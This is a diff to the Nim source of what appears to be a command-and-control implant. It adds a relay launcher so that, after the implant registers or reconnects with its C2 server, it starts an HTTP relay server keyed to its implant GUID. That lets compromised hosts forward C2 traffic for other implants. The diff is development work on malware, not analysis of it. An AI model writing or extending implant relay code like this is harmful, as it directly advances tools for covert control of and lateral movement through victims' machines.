@@ -13,6 +13,7 @@ from core/webClientListener import getStoredImplantID, storeImplantID, postRawDa
 from config/configParser import parseConfig, INITIAL_XOR_KEY
 import util/[strenc, sysinfo, crypto]
 import core/cmdParser
+import core/relay_launcher
 # Old relay system removed - will be replaced with simple HTTP relay
 
 # Re-export system info functions for compatibility
@@ -603,6 +604,16 @@ proc httpHandler() {.async.} =
                         when defined debug:
                             echo "[DEBUG] 🔑 RECONNECTION FIX: Synced g_relayClientKey from listener"
                             echo "[DEBUG] 🔑 RECONNECTION FIX: Key length: " & $g_relayClientKey.len
+                    
+                    # Start HTTP relay server if RELAY_PORT is configured
+                    if relay_launcher.isRelayServer() and listener.id != "":
+                        when defined debug:
+                            echo "[RELAY] 🚀 Starting HTTP relay server after reconnection with GUID: " & listener.id
+                        try:
+                            await relay_launcher.startRelayServerAsync(listener.id)
+                        except Exception as e:
+                            when defined debug:
+                                echo "[RELAY] ❌ Failed to start relay server: " & e.msg
                 else:
                     when defined debug:
                         echo "[DEBUG] ❌ HTTP Handler: Direct C2 reconnection failed - will register as new implant"
@@ -630,6 +641,16 @@ proc httpHandler() {.async.} =
                     when defined debug:
                         echo "[DEBUG] 🔑 INITIALIZATION FIX: Synced g_relayClientKey from listener"
                         echo "[DEBUG] 🔑 INITIALIZATION FIX: Key length: " & $g_relayClientKey.len
+                
+                # Start HTTP relay server if RELAY_PORT is configured
+                if relay_launcher.isRelayServer() and listener.registered and listener.id != "":
+                    when defined debug:
+                        echo "[RELAY] 🚀 Starting HTTP relay server after initial registration with GUID: " & listener.id
+                    try:
+                        await relay_launcher.startRelayServerAsync(listener.id)
+                    except Exception as e:
+                        when defined debug:
+                            echo "[RELAY] ❌ Failed to start relay server: " & e.msg
         else:
             # IN relay mode - encryption key must come from RelayServer, not direct C2 HTTP
             when defined debug:
@@ -671,6 +692,19 @@ proc httpHandler() {.async.} =
             
             when defined debug:
                 echo "[DEBUG] 🌐 HTTP Handler: Direct C2 registration completed"
+            
+            # Start HTTP relay server if RELAY_PORT is configured
+            if relay_launcher.isRelayServer() and listener.registered and listener.id != "":
+                when defined debug:
+                    echo "[RELAY] 🚀 Starting HTTP relay server with implant GUID: " & listener.id
+                    echo "[RELAY] 🚀 Port: " & $relay_launcher.getRelayServerPort()
+                
+                try:
+                    # Start relay server asynchronously with the real implant GUID
+                    await relay_launcher.startRelayServerAsync(listener.id)
+                except Exception as e:
+                    when defined debug:
+                        echo "[RELAY] ❌ Failed to start relay server: " & e.msg
         elif inRelayMode:
             when defined debug:
                 echo "[DEBUG] 🔗 HTTP Handler: Skipping C2 registration - in relay mode"
@@ -2594,7 +2628,7 @@ proc runMultiImplant*() {.async.} =
         when defined debug:
             echo "[DEBUG] No relay address specified - continuing with STANDARD HTTP mode"
         
-        # Start HTTP handler only - relay server starts on demand via commands
+        # Start HTTP handler only - relay server starts inside httpHandler after registration
         when defined debug:
             echo "[DEBUG] 🚀 Starting HTTP Handler (relay server on-demand only)"
             echo "[DEBUG] ✅ Starting async event loop"
